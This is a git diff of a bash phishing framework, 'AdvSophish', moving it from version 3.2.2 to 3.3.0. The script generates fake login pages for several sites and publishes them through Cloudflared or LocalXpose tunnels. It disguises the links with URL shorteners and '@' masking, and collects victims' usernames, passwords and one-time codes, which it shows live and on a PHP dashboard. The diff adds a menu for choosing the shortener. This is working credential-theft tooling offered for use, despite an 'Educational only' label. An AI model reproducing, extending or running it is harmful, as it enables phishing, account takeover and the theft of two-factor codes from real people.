@@ -1,11 +1,10 @@
 #!/bin/bash
 
-##   AdvSophish - Advanced Phishing Framework (Portable)
+##   AdvSophish - Advanced Phishing Framework (Fully Portable)
 ##   Author: mahi-cyberaware
-##   Version: 3.2.2
+##   Version: 3.3.0
 ##   GitHub: https://github.com/mahi-cyberaware/AdvSophish
 
-# No set -euo pipefail here – we handle errors manually for better portability
 trap 'kill_pid; reset_color' INT TERM EXIT
 
 # ------------------------------- Portable Base Dir -------------------------
@@ -18,21 +17,20 @@ fi
 HOST='127.0.0.1'
 PORT='8080'
 DASHBOARD_PORT='8081'
-MASK_URL=""
+SHORTENER="isgd"   # Default: isgd, can be tinyurl, none
 
 # ------------------------------- Safe Colors -------------------------------
 if [[ -t 1 ]]; then
-    RED='\033[31m'; GREEN='\033[32m'; ORANGE='\033[33m'
-    BLUE='\033[34m'; CYAN='\033[36m'; WHITE='\033[37m'; RESET='\033[0m'
+    RED='\e[31m'; GREEN='\e[32m'; ORANGE='\e[33m'; BLUE='\e[34m'
+    CYAN='\e[36m'; WHITE='\e[37m'; YELLOW='\e[93m'; RESET='\e[0m'
+    BOLD='\e[1m'; DIM='\e[2m'
 else
-    RED=''; GREEN=''; ORANGE=''; BLUE=''; CYAN=''; WHITE=''; RESET=''
+    RED=''; GREEN=''; ORANGE=''; BLUE=''; CYAN=''; WHITE=''; YELLOW=''; RESET=''; BOLD=''; DIM=''
 fi
 
 reset_color() { printf "%b" "$RESET"; }
 if command -v tput &>/dev/null; then
-    # Use tput only if available and no error
     tput sgr0 2>/dev/null || true
-    tput op 2>/dev/null || true
 fi
 
 # ------------------------------- Create directories -------------------------
@@ -45,23 +43,25 @@ kill_pid() {
     done
 }
 
+# Clean banner - AdvSophish only
 banner() {
     clear
-    cat <<-EOF
-		${ORANGE}    _    _     _       _____ _     _     _     
-		${ORANGE}   / \  | |   | |     |_   _| |__ (_)___| |__  
-		${ORANGE}  / _ \ | |   | |       | | | '_ \| / __| '_ \ 
-		${ORANGE} / ___ \| |___| |___    | | | | | | \__ \ | | |
-		${ORANGE}/_/   \_\_____|_____|   |_| |_| |_|_|___/_| |_|
-		${ORANGE}                AdvSophish ${RED}Version : 3.2.2
-
-		${GREEN}[${WHITE}-${GREEN}]${CYAN} Advanced Phishing Framework - mahi-cyberaware${RESET}
-	EOF
+    echo -e "${CYAN}${BOLD}"
+    echo "    █████╗ ██████╗ ██╗   ██╗███████╗ ██████╗ ██████╗ ██╗███████╗██╗  ██╗"
+    echo "   ██╔══██╗██╔══██╗██║   ██║██╔════╝██╔═══██╗██╔══██╗██║██╔════╝██║  ██║"
+    echo "   ███████║██║  ██║██║   ██║███████╗██║   ██║██████╔╝██║███████╗███████║"
+    echo "   ██╔══██║██║  ██║╚██╗ ██╔╝╚════██║██║   ██║██╔═══╝ ██║╚════██║██╔══██║"
+    echo "   ██║  ██║██████╔╝ ╚████╔╝ ███████║╚██████╔╝██║     ██║███████║██║  ██║"
+    echo "   ╚═╝  ╚═╝╚═════╝   ╚═══╝  ╚══════╝ ╚═════╝ ╚═╝     ╚═╝╚══════╝╚═╝  ╚═╝"
+    echo -e "${RESET}${DIM}                     Advanced Phishing Framework${RESET}"
+    echo -e "${GREEN}${BOLD}                       v3.3.0${RESET}"
+    echo -e "${CYAN}                  mahi-cyberaware${RESET}"
+    echo
 }
 
-# ------------------------------- Dependency Check (no auto‑install) ------
+# ------------------------------- Dependency Check --------------------------
 check_dependencies() {
-    echo -e "\n${GREEN}[+]${CYAN} Checking required tools...${RESET}"
+    echo -e "\n${GREEN}[+]${WHITE} Checking required tools...${RESET}"
     local missing=()
     command -v php &>/dev/null || missing+=("php")
     command -v curl &>/dev/null || missing+=("curl")
@@ -69,7 +69,10 @@ check_dependencies() {
     
     if [[ ${#missing[@]} -gt 0 ]]; then
         echo -e "${RED}[-] Missing: ${missing[*]}${RESET}"
-        echo -e "${ORANGE}[!] Please install them manually (e.g., 'sudo apt install php curl unzip' or 'pkg install php curl unzip')${RESET}"
+        echo -e "${ORANGE}[!] Please install manually:${RESET}"
+        echo -e "${YELLOW}    Ubuntu/Debian: sudo apt install php curl unzip${RESET}"
+        echo -e "${YELLOW}    Termux: pkg install php curl unzip${RESET}"
+        echo -e "${YELLOW}    Arch: sudo pacman -S php curl unzip${RESET}"
         exit 1
     fi
     echo -e "${GREEN}[+] All required tools present.${RESET}"
@@ -79,7 +82,10 @@ check_dependencies() {
 download_binary() {
     local url="$1" output="$2"
     echo -e "${GREEN}[+] Downloading $output...${RESET}"
-    curl -L --silent --insecure --fail --retry 2 -o "$output" "$url"
+    curl -L --silent --insecure --fail --retry 2 -o "$output" "$url" || {
+        echo -e "${RED}[-] Failed to download $output${RESET}"
+        return 1
+    }
     chmod +x "$output"
 }
 
@@ -94,7 +100,7 @@ install_cloudflared() {
         x86_64)        url="https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64" ;;
         *)             url="https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-386" ;;
     esac
-    download_binary "$url" ".server/cloudflared"
+    download_binary "$url" ".server/cloudflared" || return 1
 }
 
 install_localxpose() {
@@ -109,14 +115,17 @@ install_localxpose() {
         *)             url="https://api.localxpose.io/api/v2/downloads/loclx-linux-386.zip" ;;
     esac
     local zipfile=".server/loclx.zip"
-    curl -L --silent --insecure --fail --retry 2 -o "$zipfile" "$url"
+    curl -L --silent --insecure --fail --retry 2 -o "$zipfile" "$url" || {
+        echo -e "${RED}[-] Failed to download LocalXpose${RESET}"
+        return 1
+    }
     unzip -qq "$zipfile" -d ".server/"
     mv .server/loclx_* .server/loclx 2>/dev/null || true
     chmod +x ".server/loclx"
     rm -f "$zipfile"
 }
 
-# ------------------------------- Site Templates (no associative arrays) ----
+# ------------------------------- Site Templates ----------------------------
 generate_site() {
     local site_id="$1"
     local name="$2"
@@ -184,7 +193,6 @@ PHP
 
 generate_all_sites() {
     echo -e "${GREEN}[+] Generating all phishing templates...${RESET}"
-    # List: id|name|color|icon
     while IFS='|' read -r id name color icon; do
         generate_site "$id" "$name" "$color" "$icon"
     done <<-EOF
@@ -233,23 +241,43 @@ setup_site() {
 }
 
 capture_data() {
-    echo -e "\n${GREEN}[+]${CYAN} Waiting for victim... (Ctrl+C to stop)${RESET}"
+    echo -e "\n${GREEN}[+]${WHITE} Waiting for victim... (Ctrl+C to stop)${RESET}"
     tail -n0 -f "$BASE_DIR/auth/usernames.dat" "$BASE_DIR/auth/otp.dat" 2>/dev/null | while read line; do
-        echo -e "${RED}[!]${GREEN} Capture: ${BLUE}$line${RESET}"
+        echo -e "${RED}[!]${GREEN} Capture: ${WHITE}$line${RESET}"
     done
+}
+
+# URL shortening with user choice
+shorten_url() {
+    local long_url="$1"
+    local short_url=""
+    if [[ "$SHORTENER" == "isgd" ]]; then
+        short_url=$(curl -s "https://is.gd/create.php?format=simple&url=$long_url" 2>/dev/null)
+        if [[ -z "$short_url" || "$short_url" == *"Error"* ]]; then
+            echo -e "${YELLOW}[!] is.gd failed, trying tinyurl...${RESET}"
+            short_url=$(curl -s "https://tinyurl.com/api-create.php?url=$long_url" 2>/dev/null)
+        fi
+    elif [[ "$SHORTENER" == "tinyurl" ]]; then
+        short_url=$(curl -s "https://tinyurl.com/api-create.php?url=$long_url" 2>/dev/null)
+        if [[ -z "$short_url" || "$short_url" == *"Error"* ]]; then
+            echo -e "${YELLOW}[!] tinyurl failed, trying is.gd...${RESET}"
+            short_url=$(curl -s "https://is.gd/create.php?format=simple&url=$long_url" 2>/dev/null)
+        fi
+    else
+        short_url="$long_url"
+    fi
+    [[ -z "$short_url" ]] && short_url="$long_url"
+    echo "$short_url"
 }
 
 obfuscate_url() {
     local long_url="$1"
-    local short_url
-    short_url=$(curl -s "https://is.gd/create.php?format=simple&url=$long_url" 2>/dev/null)
-    if [[ -z "$short_url" || "$short_url" == *"Error"* ]]; then
-        short_url=$(curl -s "https://tinyurl.com/api-create.php?url=$long_url" 2>/dev/null)
-    fi
-    [[ -z "$short_url" ]] && short_url="$long_url"
-    echo -e "${GREEN}Shortened: ${CYAN}$short_url${RESET}"
+    echo -e "\n${GREEN}[+] Original URL: ${CYAN}$long_url${RESET}"
+    local short_url=$(shorten_url "$long_url")
+    echo -e "${GREEN}[+] Shortened URL: ${CYAN}$short_url${RESET}"
     if [[ -n "$MASK_URL" ]]; then
-        echo -e "${GREEN}Masked: ${CYAN}${MASK_URL}@${short_url#https://}${RESET}"
+        local masked="${MASK_URL}@${short_url#https://}"
+        echo -e "${GREEN}[+] Masked URL: ${CYAN}$masked${RESET}"
     fi
 }
 
@@ -257,12 +285,14 @@ obfuscate_url() {
 start_cloudflared() {
     local site="$1" port="$2"
     setup_site "$site"
-    echo -e "\n${GREEN}[+]${CYAN} Launching Cloudflared..."
+    echo -e "\n${GREEN}[+]${WHITE} Launching Cloudflared...${RESET}"
     ./.server/cloudflared tunnel --url "$HOST:$port" --logfile ".server/.cld.log" >/dev/null 2>&1 &
-    sleep 8
+    sleep 10
+    local url
     url=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' ".server/.cld.log" | head -1)
     if [[ -z "$url" ]]; then
-        echo -e "${RED}[-] Cloudflared failed.${RESET}"
+        echo -e "${RED}[-] Cloudflared failed to start. This may be due to network restrictions.${RESET}"
+        echo -e "${YELLOW}[!] Try using Localhost (for testing) or LocalXpose.${RESET}"
         exit 1
     fi
     obfuscate_url "$url"
@@ -272,12 +302,13 @@ start_cloudflared() {
 start_localxpose() {
     local site="$1" port="$2"
     setup_site "$site"
-    echo -e "\n${GREEN}[+]${CYAN} Launching LocalXpose..."
+    echo -e "\n${GREEN}[+]${WHITE} Launching LocalXpose...${RESET}"
     ./.server/loclx tunnel --raw-mode http --https-redirect -t "$HOST:$port" > ".server/.loclx" 2>&1 &
-    sleep 12
+    sleep 14
+    local url
     url=$(grep -o '[0-9a-zA-Z.]*\.loclx.io' ".server/.loclx" | head -1)
     if [[ -z "$url" ]]; then
-        echo -e "${RED}[-] LocalXpose failed.${RESET}"
+        echo -e "${RED}[-] LocalXpose failed. Check your token or network.${RESET}"
         exit 1
     fi
     obfuscate_url "https://$url"
@@ -303,7 +334,7 @@ $creds = []; $otps = [];
 if (file_exists($creds_file)) { $lines = file($creds_file, FILE_IGNORE_NEW_LINES); foreach ($lines as $line) { $d = explode('|', $line); if (count($d)>=4) $creds[] = ['site'=>$d[0],'user'=>$d[1],'pass'=>$d[2],'time'=>$d[3]]; } }
 if (file_exists($otp_file)) { $lines = file($otp_file, FILE_IGNORE_NEW_LINES); foreach ($lines as $line) { $d = explode('|', $line); if (count($d)>=3) $otps[] = ['site'=>$d[0],'otp'=>$d[1],'time'=>$d[2]]; } }
 if (isset($_GET['del'])) { if ($_GET['del']=='creds') file_put_contents($creds_file,''); if ($_GET['del']=='otp') file_put_contents($otp_file,''); header('Location: index.php'); exit; }
-?><!DOCTYPE html><html><head><title>AdvSophish Dashboard</title><style>body{background:#0a0e1a;color:#eee;font-family:monospace;padding:20px;}.container{max-width:1400px;margin:auto;background:#161c2c;border-radius:12px;padding:20px;}h1{color:#ff9800;}table{width:100%;border-collapse:collapse;margin-top:20px;}th,td{padding:10px;text-align:left;border-bottom:1px solid #2a3246;}th{background:#0f1422;}.btn{background:#2a3a5a;color:white;padding:8px 16px;text-decoration:none;border-radius:6px;margin-right:10px;}.btn-danger{background:#a12a2a;}</style></head><body><div class=container><h1>AdvSophish Dashboard</h1><div><a class=btn href="?del=creds">Clear Credentials</a><a class=btn href="?del=otp">Clear OTPs</a></div><h2>Credentials (<?=count($creds)?>)</h2><table><tr><th>Site</th><th>Username</th><th>Password</th><th>Time</th></tr><?php foreach($creds as $c) echo "<tr><td>{$c['site']}</td><td>{$c['user']}</td><td>{$c['pass']}</td><td>{$c['time']}</td></tr>"; ?></table><h2>OTPs (<?=count($otps)?>)</h2><tr><tr><th>Site</th><th>OTP</th><th>Time</th></tr><?php foreach($otps as $o) echo "<tr><td>{$o['site']}</td><td>{$o['otp']}</td><td>{$o['time']}</td></tr>"; ?></table></div></body></html>
+?><!DOCTYPE html><html><head><title>AdvSophish Dashboard</title><style>body{background:#0a0e1a;color:#eee;font-family:monospace;padding:20px;}.container{max-width:1400px;margin:auto;background:#161c2c;border-radius:12px;padding:20px;}h1{color:#ff9800;}table{width:100%;border-collapse:collapse;margin-top:20px;}th,td{padding:10px;text-align:left;border-bottom:1px solid #2a3246;}th{background:#0f1422;}.btn{background:#2a3a5a;color:white;padding:8px 16px;text-decoration:none;border-radius:6px;margin-right:10px;}.btn-danger{background:#a12a2a;}</style></head><body><div class=container><h1>AdvSophish Dashboard</h1><div><a class=btn href="?del=creds">Clear Credentials</a><a class=btn href="?del=otp">Clear OTPs</a></div><h2>Credentials (<?=count($creds)?>)</h2><table><tr><th>Site</th><th>Username</th><th>Password</th><th>Time</th></tr><?php foreach($creds as $c) echo "<tr><td>{$c['site']}</td><td>{$c['user']}</td><td>{$c['pass']}</td><td>{$c['time']}</td></tr>"; ?><table><h2>OTPs (<?=count($otps)?>)</h2><table><tr><th>Site</th><th>OTP</th><th>Time</th></tr><?php foreach($otps as $o) echo "<tr><td>{$o['site']}</td><td>{$o['otp']}</td><td>{$o['time']}</td></tr>"; ?></table></div></body></html>
 DASH
     fi
     echo -e "\n${GREEN}[+] Starting dashboard on port $DASHBOARD_PORT ...${RESET}"
@@ -313,6 +344,22 @@ DASH
     echo -e "${GREEN}[+] Dashboard URL: ${CYAN}http://$HOST:$DASHBOARD_PORT${RESET}"
     echo -e "${GREEN}[+] Press Ctrl+C to stop dashboard.${RESET}"
     wait
+}
+
+# ------------------------------- Menu Options -------------------------------
+choose_shortener() {
+    echo -e "\n${YELLOW}[?] Choose URL shortening service:${RESET}"
+    echo -e "  ${GREEN}[1]${WHITE} is.gd (default)"
+    echo -e "  ${GREEN}[2]${WHITE} tinyurl"
+    echo -e "  ${GREEN}[3]${WHITE} None (use original URL)"
+    read -p "${GREEN}[+] Select: ${WHITE}" opt
+    case $opt in
+        1) SHORTENER="isgd" ;;
+        2) SHORTENER="tinyurl" ;;
+        3) SHORTENER="none" ;;
+        *) SHORTENER="isgd" ;;
+    esac
+    echo -e "${GREEN}[+] Shortener set to: $SHORTENER${RESET}"
 }
 
 # ------------------------------- Main Menu ----------------------------------
@@ -326,27 +373,29 @@ SITE_IDS=(
 )
 
 show_menu() {
-    echo -e "\n${ORANGE}Available Phishing Targets:${RESET}"
+    echo -e "\n${WHITE}${BOLD}Available Phishing Targets:${RESET}"
     local i=1
     for id in "${SITE_IDS[@]}"; do
         name=$(echo "$id" | tr '_' ' ' | sed 's/tfo//g' | sed 's/_/ /g' | awk '{for(j=1;j<=NF;j++) $j=toupper(substr($j,1,1)) tolower(substr($j,2))}1')
-        printf "${RED}[${WHITE}%02d${RED}]${ORANGE} %-18s" $i "$name"
+        printf "${GREEN}[%02d]${CYAN} %-18s" $i "$name"
         if (( i % 3 == 0 )); then echo; fi
         ((i++))
     done
-    echo -e "\n${RED}[${WHITE}88${RED}]${ORANGE} Dashboard"
-    echo -e "${RED}[${WHITE}99${RED}]${ORANGE} About"
-    echo -e "${RED}[${WHITE}00${RED}]${ORANGE} Exit"
+    echo -e "\n${GREEN}[88]${CYAN} Dashboard"
+    echo -e "${GREEN}[89]${CYAN} Change URL Shortener (current: $SHORTENER)"
+    echo -e "${GREEN}[99]${CYAN} About"
+    echo -e "${GREEN}[00]${CYAN} Exit"
 }
 
 main_menu() {
     banner
     show_menu
-    read -p "${GREEN}[+] Choose option: ${BLUE}" choice
+    read -p "${GREEN}[+] Choose option: ${WHITE}" choice
     case $choice in
         00) echo -e "\n${GREEN}Exiting...${RESET}"; kill_pid; exit 0 ;;
         88) start_dashboard; main_menu; return ;;
-        99) banner; echo -e "${CYAN}Author: mahi-cyberaware\nGitHub: https://github.com/mahi-cyberaware/AdvSophish\nVersion: 3.2.2\nLicense: Educational only${RESET}"; read -n1; main_menu; return ;;
+        89) choose_shortener; main_menu; return ;;
+        99) banner; echo -e "${CYAN}Author: mahi-cyberaware\nGitHub: https://github.com/mahi-cyberaware/AdvSophish\nVersion: 3.3.0\nLicense: Educational only${RESET}"; read -n1 -p "Press any key..."; main_menu; return ;;
         *)
             if [[ "$choice" =~ ^[0-9]+$ ]] && (( choice >= 1 && choice <= ${#SITE_IDS[@]} )); then
                 SELECTED_SITE="${SITE_IDS[$((choice-1))]}"
@@ -359,11 +408,12 @@ main_menu() {
 }
 
 tunnel_menu() {
-    echo -e "\n${RED}[${WHITE}01${RED}]${ORANGE} Localhost"
-    echo -e "${RED}[${WHITE}02${RED}]${ORANGE} Cloudflared"
-    echo -e "${RED}[${WHITE}03${RED}]${ORANGE} LocalXpose"
-    read -p "${GREEN}[+] Tunnel: ${BLUE}" tun
-    read -p "${GREEN}[+] Custom port? (y/N): ${BLUE}" custom
+    echo -e "\n${WHITE}${BOLD}Select Tunneling Method:${RESET}"
+    echo -e "  ${GREEN}[1]${CYAN} Localhost (local network only)"
+    echo -e "  ${GREEN}[2]${CYAN} Cloudflared (external, may be blocked on some networks)"
+    echo -e "  ${GREEN}[3]${CYAN} LocalXpose (external, requires token)"
+    read -p "${GREEN}[+] Tunnel: ${WHITE}" tun
+    read -p "${GREEN}[+] Custom port? (y/N): ${WHITE}" custom
     local port=$PORT
     if [[ $custom =~ ^[Yy]$ ]]; then
         read -p "Enter port (1024-65535): " port
@@ -371,8 +421,8 @@ tunnel_menu() {
     fi
     case $tun in
         1|01) start_localhost "$SELECTED_SITE" "$port" ;;
-        2|02) install_cloudflared; start_cloudflared "$SELECTED_SITE" "$port" ;;
-        3|03) install_localxpose; start_localxpose "$SELECTED_SITE" "$port" ;;
+        2|02) install_cloudflared && start_cloudflared "$SELECTED_SITE" "$port" ;;
+        3|03) install_localxpose && start_localxpose "$SELECTED_SITE" "$port" ;;
         *) echo -e "${RED}Invalid${RESET}"; tunnel_menu ;;
     esac
 }
